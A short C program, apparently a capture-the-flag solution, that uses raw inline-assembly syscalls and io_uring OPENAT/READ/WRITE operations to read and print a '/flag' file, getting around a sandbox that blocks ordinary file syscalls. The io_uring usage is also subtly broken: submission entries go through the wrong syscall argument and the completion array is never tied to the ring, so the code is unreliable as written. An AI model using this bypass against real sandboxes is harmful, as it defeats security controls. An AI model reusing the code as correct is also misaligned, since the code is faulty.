#include <linux/io_uring.h>
#include <sys/syscall.h>

int main() {
    struct io_uring_params params = {0};
    params.flags = IORING_SETUP_NO_MMAP;
    
    long ret;
    asm volatile("syscall" : "=a"(ret) : "a"(__NR_io_uring_setup), "D"(16), "S"(&params) : "rcx", "r11", "memory");
    int ring_fd = ret;
    if (ring_fd < 0) { asm volatile("syscall" :: "a"(__NR_exit_group), "D"(1) : "rcx", "r11", "memory"); }
    
    struct io_uring_sqe sqes[16] = {0};
    struct io_uring_cqe cqes[16] = {0};
    char buf[256] = {0};
    char path[] = "/flag";
    
    // Open /flag through fd 255
    sqes[0].opcode = IORING_OP_OPENAT;
    sqes[0].fd = 255;
    sqes[0].addr = (unsigned long)path;
    sqes[0].user_data = 1;
    
    register long r10 asm("r10") = IORING_ENTER_GETEVENTS;
    register long r8 asm("r8") = (long)sqes;
    register long r9 asm("r9") = 64;
    asm volatile("syscall" : "=a"(ret) : "a"(__NR_io_uring_enter), "D"(ring_fd), "S"(1), "d"(1), "r"(r10), "r"(r8), "r"(r9) : "rcx", "r11", "memory");
    
    int file_fd = cqes[0].res;
    if (file_fd < 0) { asm volatile("syscall" :: "a"(__NR_exit_group), "D"(1) : "rcx", "r11", "memory"); }
    
    // Read from file
    sqes[1].opcode = IORING_OP_READ;
    sqes[1].fd = file_fd;
    sqes[1].addr = (unsigned long)buf;
    sqes[1].len = 256;
    sqes[1].user_data = 2;
    
    r8 = (long)&sqes[1];
    asm volatile("syscall" : "=a"(ret) : "a"(__NR_io_uring_enter), "D"(ring_fd), "S"(1), "d"(1), "r"(r10), "r"(r8), "r"(r9) : "rcx", "r11", "memory");
    
    int bytes_read = cqes[1].res;
    if (bytes_read <= 0) { asm volatile("syscall" :: "a"(__NR_exit_group), "D"(1) : "rcx", "r11", "memory"); }
    
    // Write to stdout
    sqes[2].opcode = IORING_OP_WRITE;
    sqes[2].fd = 1;
    sqes[2].addr = (unsigned long)buf;
    sqes[2].len = bytes_read;
    sqes[2].user_data = 3;
    
    r8 = (long)&sqes[2];
    asm volatile("syscall" : "=a"(ret) : "a"(__NR_io_uring_enter), "D"(ring_fd), "S"(1), "d"(1), "r"(r10), "r"(r8), "r"(r9) : "rcx", "r11", "memory");
    
    asm volatile("syscall" :: "a"(__NR_exit_group), "D"(0) : "rcx", "r11", "memory");
}
